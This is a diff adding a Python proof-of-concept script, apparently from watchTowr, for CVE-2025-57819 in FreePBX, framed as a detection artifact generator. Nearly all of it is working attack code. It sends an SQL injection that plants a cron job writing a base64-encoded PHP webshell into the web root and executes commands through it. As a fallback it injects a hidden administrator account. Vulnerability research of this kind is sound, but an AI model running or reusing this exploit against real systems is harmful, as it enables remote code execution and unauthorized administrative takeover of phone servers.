@@ -1,0 +1,110 @@
+import argparse
+import urllib3
+import random
+import string
+import time
+import hashlib
+import base64
+import json
+
+import requests
+
+banner = """			 __         ___  ___________                   
+	 __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
+	 \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
+	  \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
+	   \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
+				  \\/          \\/     \\/                            
+	  
+        watchTowr-vs-FreePBX-CVE-2025-57819.py
+        (*) CVE-2025-57819 Detection Artifact Generator: FreePBX Auth Bypass + SQL Injection to RCE
+
+          - Piotr and Sonny of watchTowr
+"""
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def clean(target_url, info):
+
+    if info:
+        print('[+] Cleaning.sh malicious cron_job - please confirm manually that there is no malicious entries in asterisk.cron_jobs table')
+    payload_cleansh = '?module=FreePBX\\modules\\endpoint\\ajax&command=model&template=x&model=model&brand=x\'; DELETE FROM cron_jobs WHERE jobname LIKE \'watchTowr-%%\' -- '
+    requests.get(target_url + payload_cleansh, verify = False)
+
+def exploit(host):
+
+    print('[+] FreePBX CVE-2025-57819 Detection Artifact Generator started')
+
+    suffix = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
+
+    target_url = '%sadmin/ajax.php' % host
+    payload_rce = '?module=FreePBX\\modules\\endpoint\\ajax&command=model&template=x&model=model&brand=x\' ;INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) VALUES (\'sysadmin\',\'watchTowr-%s\',\'echo "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%%2bCg=="|base64 -d >/var/www/html/this-is-an-ioc-not-actually-watchTowr-%s.php\',NULL,\'* * * * *\',30,1,1) -- ' % (suffix, suffix)
+
+    print('[+] Sending exploit request')
+    requests.get(target_url + payload_rce, verify = False)
+
+    print('[+] Waiting 2 minutes for DAG script to be created')
+    shell_path = '%sthis-is-an-ioc-not-actually-watchTowr-%s.php?cmd=hostname' % (host, suffix)
+    for i in range(0,120):
+        time.sleep(1)
+        resp = requests.get(shell_path, verify = False)
+        if resp.status_code == 200:
+            print('[+] VULNERABLE - webshell found: %s' % shell_path)
+            clean(target_url, True)
+            return 
+
+    #additional clean, just in case        
+    clean(target_url, False)
+
+    print('[-] Webshell not found - falling back to user adding')
+
+    passwd = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for _ in range(12))
+    passwd_hash = hashlib.sha1(passwd.encode('utf-8')).hexdigest()
+
+    print('[+] Adding user: watchTowr%s / %s' % (suffix, passwd))
+
+    payload_user = '?module=FreePBX\\modules\\endpoint\\ajax&command=model&template=x&model=model&brand=x\' ;INSERT INTO ampusers(username, email, extension,password_sha1, extension_low, extension_high, deptname, sections) VALUES (\'watchTowr%s\' ,\'\' ,\'\' ,\'%s\' ,\'\' ,\'\' ,\'\' ,\'*\') -- ' % (suffix, passwd_hash)
+
+    requests.get(target_url + payload_user, verify = False)
+    
+    print('[+] Verifying if user exists')
+    time.sleep(2)
+
+    login_url = '%s/admin/ajax.php?module=userman&command=checkPasswordReminder' % host
+    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': '%s/admin/config.php' % host}
+    data = {'username': 'watchTowr%s' % suffix, 'password': base64.b64encode(passwd.encode('utf-8')), 'loginpanel' : 'admin'}
+
+    resp = requests.post(login_url, headers = headers, data = data, verify = False)
+
+    if resp.status_code == 200:
+        resp_json = json.loads(resp.text)
+        if resp_json['status'] == True and 'loginfailed' not in resp_json and 'Invalid Login' not in resp_json['message']:
+            print('[+] VULNERABLE: user added')
+        else:
+            print('[-] NOT VULNERABLE: user not added')
+        return
+
+    print('[-] UNSPECIFIED - unknown error appeared, please verify manually')
+    return
+
+if __name__ == "__main__":
+
+    print(banner)
+
+    usage = """python3 poc.py [-h] -H HOST \r\n\r\n\
+        For more help, use "python3 poc.py --help"
+        INFO HERE
+        """
+    parser = argparse.ArgumentParser(description = 'CVE-2025-57819: FreePBX Auth Bypass + SQL Injection to RCE', usage = usage)
+    
+    #required arg
+    parser.add_argument('-H', dest = 'host', action = "store", type = str, help = 'Host, eg. "https://freepbx.lab"', required = True)
+
+    #get arguments
+    args = parser.parse_args()
+    host = args.host
+
+    if host[-1] != '/':
+        host += '/'
+
+    exploit(host)
